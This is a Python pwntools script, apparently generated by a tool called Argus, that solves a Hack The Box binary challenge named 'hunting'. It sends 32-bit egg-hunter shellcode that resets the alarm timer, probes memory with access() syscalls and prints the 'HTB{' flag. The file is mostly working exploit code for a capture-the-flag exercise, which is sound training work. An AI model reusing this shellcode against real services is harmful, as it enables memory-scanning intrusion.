#!/usr/bin/env python3
# Argus-generated egg-hunt PoC scaffold
# Chain: chains.scan_resistant_egg_hunt
# Binary: /mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7341-e1a6-4079-a523-0c768202dcf6/pwn_hunting/hunting
#
# Defensive timer: alarm(10s) — binary self-terminates.
# alarm(0xFF) at shellcode start resets the countdown.
#
# Pattern: mmap(RWX) → read(0, buf, N) → call buf
# Send shellcode padded to N bytes; no stack overflow needed.
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'warning'

fname = '/mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7341-e1a6-4079-a523-0c768202dcf6/pwn_hunting/hunting'
EGG = 0x7b425448  # 'HTB{' detected in binary strings — first 4 bytes little-endian
READ_SIZE = 60  # read(0, mmap_buf, 60) confirmed from binary analysis

shellcode = asm(f'''
        push 0xff
        pop  ebx
        push 0x1b
        pop  eax
        int  0x80           # alarm(0xFF) — reset scan-resistant timer
        mov edi, 0x7b425448
        mov edx, 0x5fffffff
    page_front:
        or  dx, 0x0fff
    address_front:
        inc  edx
        pusha
        xor  ecx, ecx
        lea  ebx, [edx + 4]
        mov  al, 0x21       # access() syscall
        int  0x80
        cmp  al, 0xf2       # EFAULT — unmapped page, skip
        popa
        jz   page_front
        cmp  [edx], edi     # egg comparison
        jnz  address_front
        mov  ecx, edx       # found — print it
        push 0x24
        pop  edx
        push 1
        pop  ebx
        mov  al, 4          # write(1, ecx, 0x24)
        int  0x80
''')
# Validated size: 55 bytes. Must fit within READ_SIZE.

def exploit(target):
    pad = (READ_SIZE - len(shellcode)) if READ_SIZE else 0
    target.send(shellcode + b'\x90' * pad)
    out = target.recvall(timeout=15)
    return out

def launch():
    """Falls back to patched binary + /tmp/l32 libs if /lib/ld-linux.so.2 absent."""
    import os, shutil, tempfile
    if os.path.exists('/lib/ld-linux.so.2'):
        return process(fname)
    ld = '/tmp/l32/usr/lib32/ld-linux.so.2'
    link = '/tmp/ld32'
    if not os.path.exists(link):
        os.symlink(ld, link)
    dst = tempfile.mktemp(suffix='_hunting')
    shutil.copy2(fname, dst)
    data = bytearray(open(dst, 'rb').read())
    old = b'/lib/ld-linux.so.2\x00'
    new = b'/tmp/ld32\x00' + b'\x00' * (len(old) - len(b'/tmp/ld32\x00'))
    idx = data.find(old)
    if idx >= 0:
        data[idx:idx + len(old)] = new
    open(dst, 'wb').write(bytes(data))
    os.chmod(dst, 0o755)
    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = '/tmp/l32/usr/lib32'
    return process(dst, env=env, cwd=os.path.dirname(os.path.abspath(fname)))

if __name__ == '__main__':
    import sys
    if len(sys.argv) >= 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = launch()
    out = exploit(r)
    if b'HTB{' in out:
        s = out.find(b'HTB{'); e = out.find(b'}', s) + 1
        print(f'Flag --> {out[s:e].decode(errors="replace")}')
    else:
        print(f'Flag --> {out[:200]}')
